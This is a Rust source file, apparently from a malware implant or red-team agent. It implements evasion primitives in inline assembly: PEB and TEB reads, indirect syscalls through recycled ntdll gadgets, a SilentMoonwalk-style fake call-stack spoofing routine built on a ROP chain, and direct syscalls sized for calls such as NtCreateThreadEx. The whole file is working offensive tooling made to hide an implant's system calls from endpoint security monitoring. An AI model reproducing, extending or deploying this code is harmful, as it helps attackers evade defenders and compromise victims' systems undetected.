// __NAME__ Agent — x86-64 inline assembly routines
//
// Rust stable `core::arch::asm!` equivalents of the C++ GAS syscall.S:
//   read_gs60  — PEB pointer from GS:[0x60]
//   read_gs30  — TEB pointer from GS:[0x30]
//   recycall   — indirect syscall via recycled gadget (no spoofing)
//   recycall_desync — DESYNC 4-frame spoofed indirect syscall
//   ch_syscall5    — direct unspoofed SYSCALL (5 args)

#![allow(dead_code)]
use core::arch::asm;

// ─── readGS60 — PEB ─────────────────────────────────────────────────────

/// Read PEB pointer from GS:[0x60] (x64 Windows).
#[inline(always)]
pub fn read_gs60() -> usize {
    let peb: usize;
    unsafe {
        asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb,
            options(nostack, nomem, preserves_flags),
        );
    }
    peb
}

/// Read TEB pointer from GS:[0x30] (x64 Windows).
#[inline(always)]
pub fn read_gs30() -> usize {
    let teb: usize;
    unsafe {
        asm!(
            "mov {}, gs:[0x30]",
            out(reg) teb,
            options(nostack, nomem, preserves_flags),
        );
    }
    teb
}

// ─── reCycall — indirect syscall via recycled gadget ─────────────────────
//
// ABI: Windows x64 — RCX, RDX, R8, R9 + stack for 5th/6th.
// We need to set EAX=SSN, R10=first_syscall_arg, then CALL gadget.
//
// Rust calling convention: we manually move args through inline asm.
//   ssn    → EAX
//   gadget → R15 (CALL R15)
//   arg1   → RCX → R10 (Windows syscall ABI R10=RCX)
//   arg2   → RDX
//   arg3   → R8
//   arg4   → R9

pub unsafe fn recycall(
    ssn: u16,
    gadget: usize,
    arg1: usize,
    arg2: usize,
    arg3: usize,
    arg4: usize,
) -> usize {
    let result: usize;
    asm!(
        // SSN → EAX from {ssn_reg}
        "movzx eax, {ssn_reg:x}",
        // gadget → caller-saved R15
        "mov r15, {gadget}",
        // Set up Windows syscall args
        "mov rcx, {a1}",
        "mov rdx, {a2}",
        "mov r8,  {a3}",
        "mov r9,  {a4}",
        // R10 = RCX per syscall ABI
        "mov r10, rcx",
        // Shadow space + call
        "sub rsp, 0x28",
        "call r15",
        "add rsp, 0x28",
        ssn_reg = in(reg) ssn as usize,
        gadget = in(reg) gadget,
        a1 = in(reg) arg1,
        a2 = in(reg) arg2,
        a3 = in(reg) arg3,
        a4 = in(reg) arg4,
        out("rax") result,
        // Clobber: all caller-saved registers + what we touch
        out("rcx") _,
        out("rdx") _,
        out("r8") _,
        out("r9") _,
        out("r10") _,
        out("r11") _,
        out("r15") _,
    );
    result
}

// ─── reCycallDesync — SilentMoonwalk DESYNC 4-frame spoofed syscall ──────
//
// DesyncContext offsets (from plan, C++ layout, #[repr(C)]):
//   +0   firstFrameAddr      +8   firstFrameSize
//  +16   secondFrameAddr    +24   secondFrameSize
//  +32   jmpRbxGadget       +40   addRspXGadget
//  +48   addRspXValue       +56   jmpRbxFrameSize
//  +64   rbpPlantOffset
//
// Fake stack built top-down on real stack (matches ade/evasion reference):
//
//   HIGH (fakeStackTop)     ← R12 - 64, aligned 16
//     [fakeStackTop-8]      = FirstFrameRetAddr   (PUSH)
//     [.. -F1Size ..]       = FirstFrame body
//     [boundary]            = SecondFrameRetAddr
//     [.. -F2Size ..]       = SecondFrame body (RBP planted at RbpPlantOffset)
//     [boundary]            = JmpRbxGadget
//     [.. -(X+8) ..]       = dead zone
//     [bottom]              = AddRspXGadget        ← RSP set here
//   LOW
//
// ROP flow: JMP R15 → syscall;ret → RET pops AddRspXGadget
//           → ADD RSP,X;RET → RET pops JmpRbxGadget → JMP [RBX]
//           → reads [R12-8] = smFixup addr → jumps to smFixup
//           → restores RSP from R12, pops callee-saved, RET

/// DESYNC-spoofed indirect syscall. Builds fake unwind frames on the stack,
/// pivots RSP, and returns through the ROP chain: AddRspX → JmpRbx → smFixup.
///
/// # Safety
/// ctx must point to a valid DesyncContext. All gadget addresses must be valid.
/// gadget must point to a syscall;ret instruction sequence in ntdll.
pub unsafe fn recycall_desync(
    ssn: u16,
    ctx: *const u8, // DesyncContext pointer
    arg1: usize,
    arg2: usize,
    arg3: usize,
    arg4: usize,
    gadget: usize,
) -> usize {
    // Pack all args into a stack array to avoid register allocation conflicts
    // with callee-saved regs that the asm block explicitly saves/restores.
    // The compiler assigns {p} to one register; we read from it immediately
    // after the push sequence (before overwriting any callee-saved reg values).
    let params: [usize; 7] = [
        ssn as usize,   // [0]  SSN
        ctx as usize,   // [8]  DesyncContext*
        arg1,            // [16] arg1
        arg2,            // [24] arg2
        arg3,            // [32] arg3
        arg4,            // [40] arg4
        gadget,          // [48] syscall;ret gadget
    ];
    let result: usize;
    asm!(
        // ── Save callee-saved regs + original RSP ──
        "push rbx",
        "push rbp",
        "push r12",
        "push r13",
        "push r14",
        "push r15",
        "mov  r12, rsp",

        // ── Load all params from array ({p} is still valid — push doesn't
        //    change the register, only copies its value to the stack) ──
        "movzx eax, word ptr [{p}]",       // [0] SSN → EAX
        "mov   r14, [{p} + 8]",            // [8] ctx → R14
        "mov   r13, [{p} + 16]",           // [16] arg1 → R13
        "mov   rcx, [{p} + 24]",           // [24] arg2
        "mov   [r12 - 16], rcx",           //  → scratch at [R12-16]
        "mov   rcx, [{p} + 32]",           // [32] arg3
        "mov   [r12 - 24], rcx",           //  → scratch at [R12-24]
        "mov   rcx, [{p} + 40]",           // [40] arg4
        "mov   [r12 - 32], rcx",           //  → scratch at [R12-32]
        "mov   r15, [{p} + 48]",           // [48] gadget → R15

        // Write smFixup address to [R12-8] for JMP [RBX] target
        "lea  rcx, [rip + 2f]",
        "mov  [r12 - 8], rcx",

        // ── Pivot RSP to fakeStackTop (below scratch area, aligned) ──
        "lea  rsp, [r12 - 64]",
        "and  rsp, -16",

        // ── Build frames top-down (matching ade/evasion reference) ──

        // FirstFrame (bottom-most legit frame — highest stack address)
        "mov  rcx, [r14]",                 // +0: FirstFrameAddr
        "push rcx",
        "mov  rcx, [r14 + 8]",            // +8: FirstFrameSize
        "sub  rsp, rcx",

        // SecondFrame boundary: write return addr at current RSP
        "mov  rcx, [r14 + 16]",           // +16: SecondFrameAddr
        "mov  [rsp], rcx",
        "mov  rcx, [r14 + 24]",           // +24: SecondFrameSize
        "sub  rsp, rcx",

        // Plant RBP in SecondFrame body: [RSP + RbpPlantOffset] → F1 boundary
        "mov  rcx, rsp",
        "add  rcx, [r14 + 24]",           // rcx = RSP + F2Size = F1 boundary
        "mov  rdx, [r14 + 64]",           // +64: RbpPlantOffset
        "mov  [rsp + rdx], rcx",

        // JmpRbx return address at current RSP
        "mov  rcx, [r14 + 32]",           // +32: JmpRbxGadget
        "mov  [rsp], rcx",

        // Allocate dead zone: AddRspXValue + 8 bytes
        "mov  rcx, [r14 + 48]",           // +48: AddRspXValue (X)
        "add  rcx, 8",
        "sub  rsp, rcx",

        // AddRspX "return address" at the very bottom
        "mov  rcx, [r14 + 40]",           // +40: AddRspXGadget
        "mov  [rsp], rcx",

        // ── RSP is now at the bottom of the fabricated stack ──

        // Set RBX = pointer to fixup address (stored at [R12-8])
        "lea  rbx, [r12 - 8]",

        // ── Load syscall args ──
        "mov  rcx, r13",                   // arg1
        "mov  rdx, [r12 - 16]",           // arg2
        "mov  r8,  [r12 - 24]",           // arg3
        "mov  r9,  [r12 - 32]",           // arg4

        // R10 = RCX per Windows syscall ABI
        "mov  r10, rcx",

        // SSN already in EAX
        // Execute: JMP to recycled syscall;ret gadget in ntdll
        "jmp  r15",

        "ud2",

        // smFixup: reached via JMP [RBX] after ROP chain
        "2:",
        "mov  rsp, r12",
        "pop  r15",
        "pop  r14",
        "pop  r13",
        "pop  r12",
        "pop  rbp",
        "pop  rbx",

        p = in(reg) params.as_ptr(),
        out("rax") result,
        out("rcx") _,
        out("rdx") _,
        out("r8") _,
        out("r9") _,
        out("r10") _,
        out("r11") _,
    );
    result
}

// ─── chSyscall5 — direct unspoofed SYSCALL (5 args) ──────────────────────
//
// Direct SYSCALL — no gadget, no spoofing. Useful for bootstrap calls
// during init or sleep obfuscation where DESYNC recursion must be avoided.

pub unsafe fn ch_syscall5(
    ssn: u16,
    arg1: usize,
    arg2: usize,
    arg3: usize,
    arg4: usize,
    arg5: usize,
) -> usize {
    let result: usize;
    asm!(
        // SSN → EAX from {ssn_reg}
        "movzx eax, {ssn_reg:x}",
        // Shift args: arg1→RCX, arg2→RDX, arg3→R8, arg4→R9
        "mov rcx, {a1}",
        "mov rdx, {a2}",
        "mov r8,  {a3}",
        "mov r9,  {a4}",
        // R10 = RCX per Windows ABI
        "mov r10, rcx",
        // Shadow space + 5th arg on stack
        "sub rsp, 0x30",
        "mov [rsp + 0x28], {a5}",
        "syscall",
        "add rsp, 0x30",
        ssn_reg = in(reg) ssn as usize,
        a1 = in(reg) arg1,
        a2 = in(reg) arg2,
        a3 = in(reg) arg3,
        a4 = in(reg) arg4,
        a5 = in(reg) arg5,
        out("rax") result,
        out("rcx") _,
        out("rdx") _,
        out("r8") _,
        out("r9") _,
        out("r10") _,
        out("r11") _,
    );
    result
}

// ─── reCycall5 — indirect syscall via recycled gadget, 5 args ─────────────
//
// Same as recycall but pushes a 5th parameter onto the stack.
// Stack layout before CALL R15: [RSP+0x20] = arg5 (becomes [gadget_RSP+0x28]).

pub unsafe fn recycall5(
    ssn: u16,
    gadget: usize,
    arg1: usize,
    arg2: usize,
    arg3: usize,
    arg4: usize,
    arg5: usize,
) -> usize {
    let result: usize;
    asm!(
        "movzx eax, {ssn_reg:x}",
        "mov r15, {gadget}",
        // Push 5th arg to stack first, before clobbering regs
        "sub rsp, 0x30",
        "mov [rsp + 0x20], {a5}",
        "mov rcx, {a1}",
        "mov rdx, {a2}",
        "mov r8,  {a3}",
        "mov r9,  {a4}",
        "mov r10, rcx",
        "call r15",
        "add rsp, 0x30",
        ssn_reg = in(reg) ssn as usize,
        gadget = in(reg) gadget,
        a1 = in(reg) arg1,
        a2 = in(reg) arg2,
        a3 = in(reg) arg3,
        a4 = in(reg) arg4,
        a5 = in(reg) arg5,
        out("rax") result,
        out("rcx") _, out("rdx") _, out("r8") _, out("r9") _,
        out("r10") _, out("r11") _, out("r15") _,
    );
    result
}

// ─── reCycall6 — indirect syscall via recycled gadget, 6 args ─────────────

pub unsafe fn recycall6(
    ssn: u16,
    gadget: usize,
    arg1: usize, arg2: usize, arg3: usize, arg4: usize,
    arg5: usize, arg6: usize,
) -> usize {
    // Pass extra args via stack array to stay within x86_64 register limits
    // (8 in(reg) + 8 out clobbers exceeds 15 usable GPRs).
    let extra = [arg5, arg6];
    let result: usize;
    asm!(
        "movzx eax, {ssn_reg:x}",
        "mov r15, {gadget}",
        "sub rsp, 0x38",
        // Load extra args from stack array via pointer
        "mov r11, [{extra}]",
        "mov [rsp + 0x20], r11",
        "mov r11, [{extra} + 8]",
        "mov [rsp + 0x28], r11",
        "mov rcx, {a1}",
        "mov rdx, {a2}",
        "mov r8,  {a3}",
        "mov r9,  {a4}",
        "mov r10, rcx",
        "call r15",
        "add rsp, 0x38",
        ssn_reg = in(reg) ssn as usize,
        gadget = in(reg) gadget,
        a1 = in(reg) arg1,
        a2 = in(reg) arg2,
        a3 = in(reg) arg3,
        a4 = in(reg) arg4,
        extra = in(reg) extra.as_ptr(),
        out("rax") result,
        out("rcx") _, out("rdx") _, out("r8") _, out("r9") _,
        out("r10") _, out("r11") _, out("r15") _,
    );
    result
}

// ─── ch_syscall6 — direct unspoofed SYSCALL, 6 args ──────────────────────

pub unsafe fn ch_syscall6(
    ssn: u16,
    arg1: usize, arg2: usize, arg3: usize, arg4: usize,
    arg5: usize, arg6: usize,
) -> usize {
    let result: usize;
    asm!(
        "movzx eax, {ssn_reg:x}",
        "mov rcx, {a1}",
        "mov rdx, {a2}",
        "mov r8,  {a3}",
        "mov r9,  {a4}",
        "mov r10, rcx",
        "sub rsp, 0x38",
        "mov [rsp + 0x28], {a5}",
        "mov [rsp + 0x30], {a6}",
        "syscall",
        "add rsp, 0x38",
        ssn_reg = in(reg) ssn as usize,
        a1 = in(reg) arg1,
        a2 = in(reg) arg2,
        a3 = in(reg) arg3,
        a4 = in(reg) arg4,
        a5 = in(reg) arg5,
        a6 = in(reg) arg6,
        out("rax") result,
        out("rcx") _, out("rdx") _, out("r8") _, out("r9") _,
        out("r10") _, out("r11") _,
    );
    result
}

// ─── ch_syscall_n — direct unspoofed SYSCALL, up to 11 args ──────────────
//
// Reads args from a caller-provided array pointer. Used for NtCreateThreadEx
// (11 parameters) and other extended Nt* calls.

pub unsafe fn ch_syscall_n(ssn: u16, args: *const usize, count: usize) -> usize {
    // Pre-extract up to 11 args into a stack array.
    // Load from array pointer inside asm to stay within x86_64 register limits
    // (11 in(reg) + 7 out clobbers far exceeds 15 usable GPRs).
    let a: [usize; 11] = {
        let mut buf = [0usize; 11];
        for i in 0..core::cmp::min(count, 11) {
            buf[i] = *args.add(i);
        }
        buf
    };

    let result: usize;
    asm!(
        "movzx eax, {ssn_reg:x}",
        // Load first 4 args from array into registers
        "mov rcx, [{arr}]",
        "mov rdx, [{arr} + 8]",
        "mov r8,  [{arr} + 16]",
        "mov r9,  [{arr} + 24]",
        "mov r10, rcx",
        // Allocate shadow + 7 stack args = 0x20 + 0x38 = 0x58, +8 for 11th = 0x60
        "sub rsp, 0x60",
        // Load remaining args from array to stack via R11 as temp
        "mov r11, [{arr} + 32]",
        "mov [rsp + 0x28], r11",
        "mov r11, [{arr} + 40]",
        "mov [rsp + 0x30], r11",
        "mov r11, [{arr} + 48]",
        "mov [rsp + 0x38], r11",
        "mov r11, [{arr} + 56]",
        "mov [rsp + 0x40], r11",
        "mov r11, [{arr} + 64]",
        "mov [rsp + 0x48], r11",
        "mov r11, [{arr} + 72]",
        "mov [rsp + 0x50], r11",
        "mov r11, [{arr} + 80]",
        "mov [rsp + 0x58], r11",
        "syscall",
        "add rsp, 0x60",
        ssn_reg = in(reg) ssn as usize,
        arr = in(reg) a.as_ptr(),
        out("rax") result,
        out("rcx") _, out("rdx") _, out("r8") _, out("r9") _,
        out("r10") _, out("r11") _,
    );
    result
}
